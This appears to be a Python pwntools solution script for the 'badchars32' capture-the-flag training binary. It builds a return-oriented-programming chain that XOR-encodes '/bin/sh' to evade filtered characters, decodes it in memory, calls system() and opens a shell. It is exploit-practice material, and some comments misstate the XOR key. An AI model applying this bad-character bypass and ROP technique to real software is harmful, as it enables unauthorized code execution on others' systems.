from pwn import *
# import angr, angrop

# badchars are: b i c / <space> f n s

prog = process("./badchars32")
# p = angr.Project("badchars32")

# rop = p.analyses.ROP()
# rop.find_gadgets()

xor = p32(0x08048890) # xor byte [ebx], cl; ret
mov = p32(0x08048893) # mov qword [edi], esi; ret
pop_esi_edi = p32(0x08048899) # pop esi; pop edi; ret
pop_ebx_ecx = p32(0x08048896) # pop ebx; pop ecx; ret
pop_ebx = p32(0x08048916) # pop ebx; ret

xor_value = 0x91919191
data_addr = [p32(a) for a in range(0x0804a038, 0x0804a040)]
system_call = p32(0x080487b7)

payload = "A" * 44

payload += pop_esi_edi;
payload += p32(0x6e69622f ^ xor_value) # /bin in reverse order in hex xor'd 0xa6
print "First set of bytes xor'd:"
print p32(0x6e69622f ^ xor_value).encode("hex")
payload += data_addr[0]
payload += mov

payload += pop_esi_edi;
payload += p32(0x0068732f ^ xor_value) # /sh\0 in reverse order in hex xor'd 0xa6
print "Second set of bytes xor'd:"
print p32(0x0068732f ^ xor_value).encode("hex")
payload += data_addr[4]
payload += mov

payload += pop_ebx_ecx
payload += data_addr[0]
payload += p32(xor_value)

for i in range(1, 8):
    payload += xor
    payload += pop_ebx
    payload += data_addr[i]

payload += xor

payload += system_call
payload += data_addr[0]

open('payload', 'w').write(payload)

print prog.recvuntil(">")
prog.clean()

prog.sendline(payload)

prog.interactive()
